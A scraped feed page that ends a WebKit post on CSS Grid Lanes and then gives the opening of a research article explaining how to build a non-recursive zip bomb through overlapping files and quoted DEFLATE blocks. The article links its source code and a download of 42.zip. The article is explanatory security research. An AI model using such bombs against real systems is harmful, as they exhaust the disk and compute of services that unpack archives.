  <span>article</span><span>:nth-child</span>(2), <span>article</span><span>:nth-child</span>(3), <span>article</span><span>:nth-child</span>(4), <span>article</span><span>:nth-child</span>(5), <span>article</span><span>:nth-child</span>(6), <span>article</span><span>:nth-child</span>(7), <span>article</span><span>:nth-child</span>(8) { 
    <span>grid-column</span>: <span>span</span> <span>2</span>; 
  }
}
</code></pre>
<p>All the article teasers are first set to span 1 column. Then the 1st item is specifically told to span 4 columns, while the 2nd – 8th to span 2 columns. This creates a far more dynamic graphic design than the typical symmetrical, everything the same-width, everything the same-height layout that’s dominated over the last decade.</p>
<h3>Placing items</h3>
<p>We can also explicitly place items while using Grid Lanes. Here, the header is always placed in the last column, no matter how many columns exist.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-museum.png" alt="A layout of paintings —&nbsp;each has a bit of text below the painting: title, etc. The paintings are laid out in 8 columns. Over on the right, spanning across two columns is the header of the website. " width="2000" height="1279" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-museum.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-300x192.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-1024x655.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-768x491.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-1536x982.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"><figcaption>Try out the <a href="https://webkit.org/demos/grid3/museum/">demo of a museum website layout</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>main</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>24</span><span>ch</span>, <span>1</span><span>fr</span>));
}
<span>header</span> {
  <span>grid-column</span>: <span>-3</span> / <span>-1</span>;
}
</code></pre>
<h2>Changing directions</h2>
<p>Yes, lanes can go either direction! All of the examples above happen to create a “waterfall” shape, where the content is laid out in columns. But Grid Lanes can be used to create a layout in the other direction, in a “brick” layout shape.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout.png" alt="Contrasting cartoon drawings: on the left, waterfall layout with boxes lined up in columns, falling down the page. And &quot;brick&quot; layout, with boxes flowing left to right, stacked like bricks in rows." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>The browser automatically creates a waterfall layout when you define columns with <code>grid-template-columns</code>, like this:</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span>;
}
</code></pre>
<p>If you want a brick layout in the other direction, instead define the rows with <code>grid-template-rows</code>:</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-rows</span>: <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span>;
}
</code></pre>
<p>This works automatically thanks to a new default for<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/grid-auto-flow"><code>grid-auto-flow</code></a>, the <code>normal</code> value.  It figures out whether to create columns or rows based on whether you defined the lanes using <code>grid-template-columns</code> or <code>grid-template-rows</code>.</p>
<p>The CSS Working Group is still discussing which property will explicitly control the flow orientation, and what its syntax will be. The debate is over whether to reuse <code>grid-auto-flow</code> or create new properties like <code>grid-lanes-direction</code>. If you’re interested in reading about the options being considered or chime in with your thoughts, see <a href="https://github.com/w3c/csswg-drafts/issues/12803#issuecomment-3643945412">this discussion</a>.</p>
<p>However, since <code>normal</code> will be the initial value either way, you don’t have to wait for this decision to learn Grid Lanes. When you define only one direction — <code>grid-template-rows</code> <em>or</em> <code>grid-template-columns</code> — it will Just Work™. (If it doesn’t, check if <code>grid-auto-flow</code> is set to a conflicting value. You can<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Values/unset"><code>unset</code></a> it if needed.)</p>
<h2>Placement sensitivity</h2>
<p>“Tolerance” is a new concept created for Grid Lanes. It lets you adjust just how picky the layout algorithm is when deciding where to place items.</p>
<p>Look at the next drawing. Notice that Car 4 is a tiny bit shorter than Car 1. When the “tolerance” is zero, Car 6 ends up in the right-most lane, while Car 7 is on the left. Car 6 ends up behind Car 4 on the right because that gets it a tiny bit closer “down the road” (closer to the top of the Grid container). Car 7 then takes the next-closest-to-the-top slot, and ends up behind Car 1 on the left. The end result? The first horizontal grouping of content is ordered 1, 2, 3, 4, and the next is 7, 5, 6.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1.png" alt="Same cartoon drawing of the highway of bumper to bumper traffic from above." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>But the difference in length between Car 1 and Car 4 is tiny. Car 6 isn’t meaningfully closer to the top of the page. And having item 6 on the right, with item 7 on the left is likely an unexpected experience — especially for users who are tabbing through content, or when the content order is somehow labeled.</p>
<p>These tiny differences in size don’t matter in any practical sense. Instead, the browser should consider item sizes like Car 1 and Car 4 to be a tie. That’s why the default for <code>item-tolerance</code> is <code>1em</code> — which means only differences in content length greater than 1 em will matter when figuring out where the next item goes.</p>
<p>If you’d like the layout of items to shuffle around less, you can set a higher value for <code>item-tolerance</code>. In the next digram, the tolerance is set to half-a-car, causing the cars to lay out basically from left to right and only moving to another lane to avoid the extra-long limo. Now, the horizontal groupings of content are 1, 2, 3, 4, and 5, 6, 7.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2.png" alt="Now the highway has the cars ordered in a fashion that's less chaotic." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>Think of tolerance as how chill you want the car drivers to be. Will they change lanes to get just a few inches ahead? Or will they only move if there’s a lot of space in the other lane? The amount of space you want them to care about is the amount you set in <code>item-tolerance</code>.</p>
<p>Remember that people tabbing through the page will see each item highlighted as it comes into focus, and may be experiencing the page through a screenreader. An item tolerance that’s set too high can create an awkward experience jumping up and down the layout. An item tolerance that’s too low can result in jumping back and forth across the layout more than necessary. Adjust <code>item-tolerance</code> to something appropriate for the sizes and size variations of your content.</p>
<p>Currently, this property is named <code>item-tolerance</code> in the <a href="https://www.w3.org/TR/css-grid-3/#placement-tolerance">specification</a> and in Safari Technology Preview 234. However, there is still a chance this name will change, perhaps to something like <code>flow-tolerance</code> or <code>pack-tolerance</code>. If you have a preference, or ideas for a better name, you can <a href="https://github.com/w3c/csswg-drafts/issues/10884#issuecomment-3658059682">chime in here</a>. Keep an eye out for updates about the final name before using this property on production websites.</p>
<h2>Try it out</h2>
<p>Try out Grid Lanes in Safari Technology Preview 234! All of the demos at  <a href="https://webkit.org/demos/grid3/">webkit.org/demos/grid3</a> have been updated with the new syntax, including other use cases for Grid Lanes. It’s not just for images! For example, a mega menu footer full of links suddenly becomes easy to layout.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light.png" alt="A layout of 15 groups of links. Each has between two and nine links in the group —&nbsp;so they are all very different heights from each other. The layout has five columns of these groups, where each group just comes right after the group above it. Without any regard for rows.  " width="2000" height="1164" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-300x175.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-1024x596.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-768x447.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-1536x894.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/megamenu/">mega menu demo</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>max-content</span>, <span>24</span><span>ch</span>));
  <span>column-gap</span>: <span>4</span><span>lh</span>;
}
</code></pre>
<h2>What’s next?</h2>
<p>There are a few last decisions for the CSS Working Group to make. But overall, the feature as described in this article is ready to go. It’s time to try it out. And it’s finally safe to commit the basic syntax to memory!</p>
<p>We’d love for you to make some demos! Demonstrate what new use cases you can imagine. And let us know about any bugs or possible improvements you discover. Ping Jen Simmons on <a href="https://bsky.app/profile/jensimmons.bsky.social">Bluesky</a> or <a href="https://front-end.social/@jensimmons">Mastodon</a> with links, comments and ideas.</p>
<p>Our team has been working on this since mid-2022, implementing in WebKit and writing the web standard. We can’t wait to see what you will do with it.</p>

                            </div>
        </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Better Zip Bomb (161 pts)]]></title>
            <link>https://www.bamsoftware.com/hacks/zipbomb/</link>
            <guid>46331216</guid>
            <pubDate>Fri, 19 Dec 2025 21:34:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bamsoftware.com/hacks/zipbomb/">https://www.bamsoftware.com/hacks/zipbomb/</a>, See on <a href="https://news.ycombinator.com/item?id=46331216">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

<header>


<address id="contact">
<p>
David Fifield<br>
<a href="mailto:david@bamsoftware.com">david@bamsoftware.com</a>
</p>
</address>

<p>
<time>2019-07-02</time>
<small>updated <time>2019-07-03</time>, <time>2019-07-05</time>, <time>2019-07-06</time>, <time>2019-07-08</time>,
<time>2019-07-18</time>, <time>2019-07-20</time>, <time>2019-07-22</time>, <time>2019-07-24</time>,
<time>2019-08-05</time>, <time>2019-08-19</time>, <time>2019-08-22</time>, <time>2019-10-14</time>,
<time>2019-10-18</time>, <time>2019-10-30</time>, <a href="#xfinity"><time>2019-11-28</time></a>,
<a href="#flytech"><time>2020-07-28</time></a>, <time>2021-01-21</time>, <time>2021-02-02</time>,
<a href="#ios"><time>2021-05-03</time></a>, <time>2021-07-29</time>,
<a href="#42.zip-tld"><time>2023-05-18</time></a>
</small>
</p>
</header>

<section id="summary">
<h2>Summary</h2>

<p>
This article shows how to construct a
<em>non-recursive</em> <a href="https://en.wikipedia.org/wiki/Zip_bomb">zip bomb</a>
that achieves a high compression ratio by
overlapping files inside the zip container.
"Non-recursive" means that it does not rely on
a decompressor's recursively unpacking zip files nested within zip files:
it expands fully after a single round of decompression.
The output size increases quadratically in the input size,
reaching a compression ratio of over <data value="28442385.9286689">28&nbsp;million</data>
(<data value="9893525">10&nbsp;<abbr title="megabyte">MB</abbr></data> → <data value="281395456244934">281&nbsp;<abbr title="terabyte">TB</abbr></data>)
at the limits of the zip format.
Even greater expansion is possible using
64-bit extensions.
The construction uses only the most common compression algorithm, DEFLATE,
and is compatible with most zip parsers.
</p>



<dl id="source">
<dt>Source code:</dt>
<dd>
<pre>git clone https://www.bamsoftware.com/git/zipbomb.git</pre>
<a href="https://www.bamsoftware.com/hacks/zipbomb/zipbomb-20210121.zip">zipbomb-20210121.zip</a>
</dd>
<dt>Data and source for figures:</dt>
<dd>
<pre>git clone https://www.bamsoftware.com/git/zipbomb-paper.git</pre>
</dd>
</dl>

<p>
<a href="https://www.bamsoftware.com/talks/woot19-zipbomb/">Presentation video</a>
</p>

<p>
<a href="https://habr.com/ru/post/459254/">Русский перевод</a> от <a href="https://habr.com/en/users/m1rko/">@m1rko</a>.
</p>
<p>
<a href="https://zerosun.top/2019/07/07/A-better-zip-bomb/">中文翻译</a>: 北岸冷若冰霜.
</p>
<!-- https://blog.csdn.net/u013469753/article/details/106298143 -->
</section>

<section id="introduction">

<table id="comparison">

<!--
Uncompressed size of 42.zip not including intermediate files, only final 0.dll:
>>> 16*16*16*16*16*4294967295
4503599626321920
Uncompressed size of 42.zip including all intermediate files:
>>> 16*(34902 + 16*(29446 + 16*(32150 + 16*(165302 + 16*(4168266 + 4294967295)))))
4507981343026016
-->

<caption id="42-note">
<ul>
<li>
There are two versions of 42.zip,
an <a href="https://web.archive.org/web/20120222083624/http://www.unforgettable.dk/">older version</a> of <data value="42374">42 374</data> bytes,
and a <a href="https://web.archive.org/web/20120301154142/http://www.unforgettable.dk/">newer version</a> of <data value="42838">42 838</data> bytes.
The difference is that the newer version requires a password before unzipping.
We compare only against the older version.
Here is a copy if you need it:
<a href="https://www.bamsoftware.com/hacks/zipbomb/42.zip" download="">42.zip</a>.
</li>
</ul>

</caption>

<thead>
<tr>
<td colspan="2"></td>
<th colspan="2">non-recursive</th>
<th colspan="2">recursive</th>
</tr>
<tr>
<td></td>
<th>zipped size</th>
<th>unzipped size</th>
<th>ratio</th>
<th>unzipped size</th>
<th>ratio</th>
</tr>
</thead>

<tbody>
<tr>
<th><a href="https://research.swtch.com/zip">Cox quine</a></th>
<td><data value="440">440</data></td>
<td><data value="440">440</data></td>
<td><data value="1.0">1.0</data></td>
<td><data value="∞">∞</data></td>
<td><data value="∞">∞</data></td>
</tr>

<tr>
<th><a href="https://web.archive.org/web/20160130230432/http://www.steike.com/code/useless/zip-file-quine/">Ellingsen quine</a></th>
<td><data value="28809">28 809</data></td>
<td><data value="42569">42 569</data></td>
<td><data value="1.4776285188656322">1.5</data></td>
<td><data value="∞">∞</data></td>
<td><data value="∞">∞</data></td>
</tr>

<tr>
<th><a href="https://www.unforgettable.dk/">42.zip</a></th>
<td><a href="#42-note">*</a><data value="42374">42 374</data></td>
<td><data value="558432">558 432</data></td>
<td><data value="13.17864728371171">13.2</data></td>
<td><data value="4507981343026016">4 507 981 343 026 016</data></td>
<td><data value="106385551116.86449">106 billion</data></td>
</tr>

<tr>
<th>this technique</th>
<td><data value="42374">42 374</data></td>
<td><data value="5461307620">5 461 307 620</data></td>
<td><data value="128883.45730872705">129 thousand</data></td>
<td><data value="5461307620">5 461 307 620</data></td>
<td><data value="128883.45730872705">129 thousand</data></td>
</tr>

<tr>
<th>this technique</th>
<td><data value="9893525">9 893 525</data></td>
<td><data value="281395456244934">281 395 456 244 934</data></td>
<td><data value="28442385.9286689">28 million</data></td>
<td><data value="281395456244934">281 395 456 244 934</data></td>
<td><data value="28442385.9286689">28 million</data></td>
</tr>

<tr>
<th>this technique <small>(Zip64)</small></th>
<td><data value="45876952">45 876 952</data></td>
<td><data value="4507981427706459">4 507 981 427 706 459</data></td>
<td><data value="98262444.01996146">98 million</data></td>
<td><data value="4507981427706459">4 507 981 427 706 459</data></td>
<td><data value="98262444.01996146">98 million</data></td>
</tr>

<!--
<tr>
<th>this technique<br><small>(Zip64, less compatible)</small></th>
<td><data value="2961656712">2 961 656 712</data></td>
<td class=nonrec><data value="18446744085437447493">18 446 744 085 437 447 493</data></td>
<td class=nonrec><data value="6228522033.190134">6 billion</data></td>
<td class=rec><data value="18446744085437447493">18 446 744 085 437 447 493</data></td>
<td class=rec><data value="6228522033.190134">6 billion</data></td>
</tr>
-->

</tbody>

</table>





<p>
Compression bombs that use the zip format
must cope with the fact that DEFLATE,
the compression algorithm most commonly supported by zip parsers,
<a href="https://www.zlib.net/zlib_tech.html">cannot achieve</a> a compression ratio greater than 1032.
For this reason, zip bombs typically rely on recursive decompression,
nesting zip files within zip files to get an extra factor of 1032 with each layer.
But the trick only works on implementations that
unzip recursively, and most do not.
The best-known zip bomb,
<a href="https://www.unforgettable.dk/">42.zip</a>,
expands to a formidable <data value="4507981343026016">4.5&nbsp;<abbr title="petabyte">PB</abbr></data>
if all six of its layers are recursively unzipped,
but a trifling <data value="558432">0.6&nbsp;<abbr title="megabyte">MB</abbr></data> at the top layer.
Zip quines,
like those of <a href="https://web.archive.org/web/20160130230432/http://www.steike.com/code/useless/zip-file-quine/">Ellingsen</a>
and <a href="https://research.swtch.com/zip">Cox</a>,
which contain a copy of themselves
and thus expand infinitely if recursively unzipped,
are likewise perfectly safe to unzip once.
</p>

<p>
This article shows how to construct a non-recursive zip bomb
whose compression ratio surpasses the DEFLATE limit of 1032.
It works by overlapping files inside the zip container,
in order to reference a "kernel" of highly compressed data
in multiple files,
without making multiple copies of it.
The zip bomb's output size grows quadratically in the input size; i.e.,
the compression ratio gets better as the bomb gets bigger.
The construction depends on features of both zip and DEFLATE—it
is not directly portable to other file formats or compression algorithms.
It is compatible with most zip parsers,
the exceptions being "streaming" parsers that
parse in one pass without first consulting the zip file's central directory.
We try to balance
two conflicting goals:
</p>

<ul>
<li>
Maximize the compression ratio.
We define the compression ratio as the the sum of the sizes
of all the files contained the in the zip file,
divided by the size of the zip file itself.
It does not count filenames or other filesystem metadata,
only contents.
</li>
<li>
Be compatible.
Zip is a tricky format and parsers differ, especially
around edge cases and optional features.
Avoid taking advantage of tricks that only work with certain parsers.
We will remark on certain ways to increase the efficiency of the zip bomb
that come with some loss of compatibility.
</li>
</ul>

</section>

<section id="zip">
<h2>Structure of a zip file</h2>

<p>
A&nbsp;zip file consists of
a <em>central directory</em> which references
<em>files</em>.
</p>

<figure id="fig-normal">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/normal.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/normal.png" alt="A block diagram of the structure of a zip file. The central directory header consists of three central directory headers labeled CDH[1] (README), CDH[1] (Makefile), and CDH[3] (demo.c). The central directory headers point backwards to three local file headers LFH[1] (README), LFH[2] (Makefile), and LFH[3] (demo.c). Each local file header is joined with file data. The three joined blocks of (local file header, file data) are labeled file 1, file 2, and file 3.">
</picture>
</figure>

<p>
The central directory is at the end of the zip file.
It is a list of <em>central directory headers</em>.
Each central directory header contains metadata for a single file,
like its filename and CRC-32 checksum,
and a backwards pointer to a local file header.
A&nbsp;central directory header is 46&nbsp;bytes long,
plus the length of the filename.
</p>

<p>
A&nbsp;file consists of a <em>local file header</em>
followed by compressed <em>file data</em>.
The local file header is 30&nbsp;bytes long,
plus the length of the filename.
It contains a redundant copy
of the metadata from the central directory header,
and the compressed and uncompressed sizes of the file data
that follows.
Zip is a container format, not a compression algorithm.
Each file's data is compressed
using an algorithm specified in the metadata—usually <a href="https://tools.ietf.org/html/rfc1951">DEFLATE</a>.
</p>



<p>
This description of the zip format omits many details that
are not needed for understanding the zip bomb.
For full information,
refer to
<a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">section&nbsp;4.3 of APPNOTE.TXT</a>
or <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">The structure of a PKZip file</a> by Florian Buchholz,
or see the <a href="#source">source code</a>.
</p>

</section>

<section id="overlap">
<h2>The first insight: overlapping files</h2>

<p>
By compressing a long string of repeated bytes,
we can produce a <em>kernel</em>
of highly compressed data.
By itself, the kernel's compression ratio cannot
exceed the DEFLATE limit of 1032,
so we want a way to reuse the kernel in many files,
without making a separate copy of it in each file.
We can do it by overlapping files:
making many central directory headers point to
a single file, whose data is the kernel.
</p>

<figure id="fig-overlap">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/overlap.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/overlap.png" alt="A block diagram of a zip file with fully overlapping files. The central directory header consists of central directory headers CDH[1], CDH[2], ..., CDH[N−1], CDH[N], with filenames A, B, ..., Y, Z. There is a single local file header LFH[1] with filename A whose file data is a compressed kernel. Every one of the central directory headers points backwards to the same local file header, LFH[1]. The lone file is multiply labeled file 1, file 2, ..., file N−1, file N.">
</picture>
</figure>

<p>
Let's look at an example to see how this construction affects the compression ratio.
Suppose the kernel is <data value="1000">1000&nbsp;bytes</data> and
decompresses to <data value="1000000">1&nbsp;<abbr title="megabyte">MB</abbr></data>.
Then the first <data value="1000000"><abbr title="megabyte">MB</abbr></data> of output "costs"
<data value="1078">1078&nbsp;bytes</data> of input:
</p>
<ul>
<li><data value="31">31&nbsp;bytes</data> for a local file header (including a 1-byte filename)</li>
<li><data value="47">47&nbsp;bytes</data> for a central directory header (including a 1-byte filename)</li>
<li><data value="1000">1000&nbsp;bytes</data> for the kernel itself</li>
</ul>
<p>
But every <data value="1000000">1&nbsp;<abbr title="megabyte">MB</abbr></data> of output
after the first costs only <data value="47">47&nbsp;bytes</data>—we don't need another local file header or another copy of the kernel,
only an additional central directory header.
So while the first reference of the kernel has a compression ratio of
1 000 000&nbsp;/&nbsp;1078 ≈&nbsp;928,
each additional reference pulls the ratio closer to
1 000 000&nbsp;/&nbsp;47 ≈&nbsp;21 277.
A&nbsp;bigger kernel raises the ceiling.
</p>

<p>
The problem with this idea is a lack of compatibility.
Because many central directory headers point to a single local file header,
the metadata—specifically the filename—cannot match for every file.
Some parsers <a href="#compatibility">balk at that</a>.
<a href="http://infozip.sourceforge.net/UnZip.html">Info-ZIP UnZip</a>
(the standard Unix <code>unzip</code> program)
extracts the files, but with warnings:
</p>
<figure>
<pre>$ <kbd>unzip overlap.zip</kbd>
<samp>  inflating: A
B:  mismatching "local" filename (A),
         continuing with "central" filename version
  inflating: B
<i>...</i></samp>
</pre>
</figure>
<p>
And the Python <a href="https://docs.python.org/3/library/zipfile.html">zipfile</a> module
<a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1486-L1489">throws an exception</a>:
</p>
<figure>
<pre>$ <kbd>python3 -m zipfile -e overlap.zip .</kbd>
<samp>Traceback (most recent call last):
<i>...</i>
__main__.BadZipFile: File name in directory 'B' and header b'A' differ.</samp>
</pre>
</figure>
<!--
<p>
We could make every central directory header have the same filename
as the local file header, but that too is unsatisfying
because it means that if extracted to disk,
all the files will just overwrite each other and not take up more space
than a single file.
</p>
-->

<p>
Next we will see how to modify the construction
for consistency of filenames,
while still retaining most of the advantage
of overlapping files.
</p>

</section>

<section id="quote">
<h2>The second insight: quoting local file headers</h2>

<p>
We need to separate the local file headers for each file,
while still reusing a single kernel.
Simply concatenating all the local file headers does not work,
because the zip parser will find a local file header
where it expects to find the beginning of a DEFLATE stream.
But the idea will work, with a minor modification.
We'll use a feature of DEFLATE, non-compressed blocks,
to "quote" local file headers
so that they appear to be part of the same DEFLATE stream
that terminates in the kernel.
Every local file header
(except the first)
will be interpreted in two ways:
as code (part of the structure of the zip file)
and as data (part of the contents of a file).
</p>

<figure id="fig-quote">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/quote.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/quote.png" alt="A block diagram of a zip file with quoted local file headers. The central directory header consists of central directory headers CDH[1], CDH[2], ..., CDH[N−1], CDH[N], with filenames A, B, ..., Y, Z. The central directory headers point to corresponding local file headers LFH[1], LFH[2], ..., LFH[N−1], LFH[N] with filenames A, B, ..., Y, Z. The files are drawn and labeled to show that file 1 does not end before file 2 begins; rather file 1 contains file 2, file 2 contains file 3, and so on. There is a small green-colored space between LFH[1] and LFH[2], and between LFH[2] and LFH[3], etc., to stand for quoting the following local file header using an uncompressed DEFLATE block. The file data of the final file, whose local file header is LFH[N] and whose filename is Z, does not contain any other files, only the compressed kernel.">
</picture>
</figure>

<p>
A DEFLATE stream is a sequence of
<a href="https://tools.ietf.org/html/rfc1951#section-3.2.3">blocks</a>,
where each block may be compressed or non-compressed.
Compressed blocks are what we usually think of;
for example the kernel is one big compressed block.
But there are also non-compressed blocks,
which start with a
<a href="https://tools.ietf.org/html/rfc1951#section-3.2.4">5-byte header</a>
with a length field that means simply, "output the next <var>n</var> bytes verbatim."
Decompressing a non-compressed block means only stripping the 5-byte header.
Compressed and non-compressed blocks may be intermixed freely
in a DEFLATE stream.
The output is the concatenation of
decompressing all the blocks in order.
The "non-compressed" notion only has meaning at the DEFLATE layer;
the file data still counts as "compressed" at the zip layer,
no matter what kind of blocks are used.
</p>

<p>
It is easiest to understand this quoted-overlap construction from the inside out,
beginning with the last file and working backwards to the first.
Start by inserting the kernel, which will form the end of file data for every file.
Prepend a local file header LFH<sub><var>N</var></sub>
and add a central directory header CDH<sub><var>N</var></sub> that points to it.
Set the "compressed size" metadata field in the LFH<sub><var>N</var></sub> and CDH<sub><var>N</var></sub> to the compressed size of the kernel.
Now prepend a 5-byte non-compressed block header (colored green in the diagram)
whose length field is equal to the size of LFH<sub><var>N</var></sub>.
Prepend a second local file header LFH<sub><var>N</var>−1</sub>
and add a central directory header CDH<sub><var>N</var>−1</sub> that points to it.
Set the "compressed size" metadata field in both of the new headers to the compressed size of the kernel
<em>plus</em> the size of the non-compressed block header (5&nbsp;bytes)
<em>plus</em> the size of LFH<sub><var>N</var></sub>.
</p>



<p>
At this point the zip file contains two files, named "Y" and "Z".
Let's walk through what a zip parser would see while parsing it.
Suppose the compressed size of the kernel is 1000&nbsp;bytes
and the size of LFH<sub><var>N</var></sub> is 31&nbsp;bytes.
We start at CDH<sub><var>N</var>−1</sub>
and follow the pointer to LFH<sub><var>N</var>−1</sub>.
The first file's filename is "Y" and
the compressed size of its file data is 1036&nbsp;bytes.
Interpreting the next 1036 bytes as a DEFLATE stream,
we first encounter the 5-byte header of a non-compressed block
that says to copy the next 31&nbsp;bytes.
We write the next 31&nbsp;bytes,
which are LFH<sub><var>N</var></sub>,
which we decompress and append to file "Y".
Moving on in the DEFLATE stream, we find a compressed block (the kernel),
which we decompress to file "Y".
Now we have reached the end of the compressed data and are done with file "Y".
Proceeding to the next file, we follow the pointer from CDH<sub><var>N</var></sub>
to LFH<sub><var>N</var></sub> and find a file named "Z"
whose compressed size is 1000&nbsp;bytes.
Interpreting those 1000&nbsp;bytes as a DEFLATE stream,
we immediately encounter a compressed block (the kernel again)
and decompress it to the file "Z".
Now we have reached the end of the final file and are done.
The output file "Z" contains the decompressed kernel;
the output file "Y" is the same, but additionally prefixed by
the 31&nbsp;bytes of
LFH<sub><var>N</var></sub>.
</p>

<p>
We complete the construction by repeating the quoting procedure
until the zip file contains the desired number of files.
Each new file adds a central directory header,
a local file header,
and a non-compressed block to quote the immediately succeeding local file header.
Compressed file data is generally a chain of DEFLATE non-compressed blocks
(the quoted local file headers)
followed by the compressed kernel.
Each byte in the kernel contributes about
1032 <var>N</var> to the output size,
because each byte is part of all <var>N</var> files.
The output files are not all the same size:
those that appear earlier in the zip file
are larger than those that appear later,
because they contain more quoted local file headers.
The contents of the output files are not particularly meaningful,
but no one said they had to make sense.
</p>

<p>
This quoted-overlap construction has better compatibility
than the full-overlap construction of the previous section,
but the compatibility comes at the expense of the compression ratio.
There, each added file cost only a central directory header;
here, it costs a central directory header,
a local file header,
and another 5&nbsp;bytes for the quoting header.
</p>

<!--
<figure>
<pre>
File "A": compressed size 1900, uncompressed size 1000775
Non-compressed block header for the next 31 bytes
...
File "X": compressed size 1072, uncompressed size 1000062
Non-compressed block header for the next 31 bytes
File "Y": compressed size 1036, uncompressed size 1000031
Non-compressed block header for the next 31 bytes
File "Z": compressed size 1000, uncompressed size 1000000
Kernel
Central Directory Header "A"
...
Central Directory Header "X"
Central Directory Header "Y"
Central Directory Header "Z"
</pre>
</figure>
-->

</section>

<section id="optimization">
<h2>Optimization</h2>

<p>
Now that we have the basic zip bomb construction,
we will try to make it as efficient as possible.
We want to answer two questions:
</p>
<ul>
<li>For a given zip file size, what is the maximum compression ratio?</li>
<li>What is the maximum compression ratio, given the limits of the zip format?</li>
</ul>

<section id="bulkdeflate">
<h3>Kernel compression</h3>

<p>
It pays to compress the kernel as densely as possible,
because every decompressed byte gets magnified by a factor of <var>N</var>.
To that end, we use a custom DEFLATE compressor
called bulk_deflate,
specialized for compressing
a string of repeated bytes.
</p>

<!--
         engine compressed_size max_uncompressed_size
1: bulk_deflate           21090              21749401
2:         zlib           21090              21723602
3:       zopfli           21090              21734018
-->

<p>
All decent DEFLATE compressors will approach a compression ratio of 1032
when given an infinite stream of repeating bytes,
but we care more about specific finite sizes
than asymptotics.
bulk_deflate compresses more data
into the same space than the general-purpose compressors:
about 26&nbsp;kB more than zlib and Info-ZIP,
and about 15&nbsp;kB more than
<a href="https://github.com/google/zopfli">Zopfli</a>,
a compressor that trades speed for density.
</p>

<figure id="max_uncompressed_size">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/max_uncompressed_size.svg" type="image/svg+xml">
